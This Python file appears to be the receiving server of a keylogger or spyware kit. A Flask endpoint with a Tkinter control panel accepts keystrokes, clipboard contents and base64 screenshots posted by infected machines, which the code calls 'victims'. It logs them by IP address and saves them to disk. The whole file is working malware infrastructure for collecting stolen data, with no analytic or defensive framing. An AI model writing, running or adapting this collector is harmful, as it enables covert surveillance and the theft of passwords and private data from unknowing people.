import threading
import base64
import json
import logging
import os
from datetime import datetime
from flask import Flask, request, jsonify
import tkinter as tk
from tkinter import scrolledtext, ttk
from werkzeug.serving import make_server

# Flask app setup
app = Flask(__name__)

# Global variable to manage server state
server = None

# Configure logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)  # Set logging level to INFO

class GUIHandler(logging.Handler):
    def __init__(self, log_widget):
        super().__init__()
        self.log_widget = log_widget
        self.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.setLevel(logging.INFO)

    def emit(self, record):
        try:
            msg = self.format(record)
            level = record.levelname
            color = "black"  # Default color for INFO
            if level == "ERROR":
                color = "red"
            elif level == "WARNING":
                color = "orange"

            # Insert the message with color formatting
            self.log_widget.insert(tk.END, msg + '\n', level)
            self.log_widget.yview(tk.END)
        except Exception:
            self.handleError(record)

class FilterFlaskLogs(logging.Filter):
    def filter(self, record):
        # Filter out records that contain HTTP request log messages
        return not ("POST / HTTP/1.1" in record.getMessage())

@app.route('/', methods=['POST'])
def handle_post():
    try:
        post_data = request.data.decode('utf-8')  # Ensure the request body is treated as UTF-8 encoded
        data = json.loads(post_data)
        
        keyboard_data = data.get('keyboardData', '')
        clipboard_data = data.get('clipboardData', '')
        screenshot_base64 = data.get('screenshot', '')

        victim_ip = request.remote_addr  # Retrieve the IP Address of the client

        if keyboard_data:
            logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
            save_to_file(keystrokes_file_path, f"{victim_ip}: {keyboard_data}")

        if show_clipboard_in_logs and clipboard_data:
            logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")
            save_to_file(clipboard_file_path, f"{victim_ip}: {clipboard_data}")

        if screenshot_base64:
            save_screenshot(screenshot_base64, victim_ip)
            logger.info(f"Screenshot saved from {victim_ip}")

        return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200

    except json.JSONDecodeError as e:
        logger.error(f"JSON parsing error: {e}")
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

    except Exception as e:
        logger.error(f"Server error: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

def save_to_file(file_path, data):
    with open(file_path, 'a') as file:
        file.write(data + '\n')  # Save data as plaintext

def save_screenshot(base64_data, victim_ip):
    image_data = base64.b64decode(base64_data)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f"{victim_ip}_screenshot_{timestamp}.png"
    file_path = os.path.join(screenshots_dir, file_name)
    with open(file_path, 'wb') as file:
        file.write(image_data)

def run_flask():
    global server
    server = make_server('0.0.0.0', 8080, app)
    server.serve_forever()

def stop_flask():
    global server
    if server:
        server.shutdown()
        server.server_close()
        server = None

# File paths and directories
keystrokes_file_path = 'saved_keystrokes.txt'
clipboard_file_path = 'saved_clipboard.txt'
screenshots_dir = 'screenshots'

# Create screenshots directory if it doesn't exist
os.makedirs(screenshots_dir, exist_ok=True)

# Flag for logging clipboard data
show_clipboard_in_logs = True

# GUI Setup
class ServerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Interactive Flask Server GUI")
        root.geometry("800x600")

        # Notebook (Tabs)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True)

        # Log Tab
        self.log_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.log_frame, text="Logs")

        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=90, height=30, wrap=tk.WORD, bg='white', fg='black')
        self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
        self.log_text.tag_configure("INFO", foreground="black")
        self.log_text.tag_configure("WARNING", foreground="orange")
        self.log_text.tag_configure("ERROR", foreground="red")

        # Set up GUI logging handler
        self.gui_handler = GUIHandler(self.log_text)
        self.gui_handler.addFilter(FilterFlaskLogs())
        logger.addHandler(self.gui_handler)  # Add the GUI handler to the root logger

        # Remove default terminal handlers
        for handler in logger.handlers[:]:
            if isinstance(handler, logging.StreamHandler):
                logger.removeHandler(handler)

        # Control Tab
        self.control_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.control_frame, text="Control")

        self.start_button = ttk.Button(self.control_frame, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self.control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.clipboard_check = ttk.Checkbutton(self.control_frame, text="Show Clipboard in Logs", command=self.toggle_clipboard_logging)
        self.clipboard_check.pack(pady=10)

        self.server_thread = None
        self.server_running = False

    def start_server(self):
        if not self.server_running:
            self.server_running = True
            self.server_thread = threading.Thread(target=run_flask, daemon=True)
            self.server_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.log("Server started.")

    def stop_server(self):
        if self.server_running:
            stop_flask()
            self.server_running = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.log("Server stopped.")

    def toggle_clipboard_logging(self):
        global show_clipboard_in_logs
        show_clipboard_in_logs = not show_clipboard_in_logs
        status = "enabled" if show_clipboard_in_logs else "disabled"
        self.log(f"Clipboard logging {status}.")

    def log(self, message):
        # Directly emit log to the GUI
        self.gui_handler.emit(logging.LogRecord(name='root', level=logging.INFO, pathname='', lineno=0, msg=message, args=None, exc_info=None))

# Initialize GUI
root = tk.Tk()
gui = ServerGUI(root)
root.mainloop()
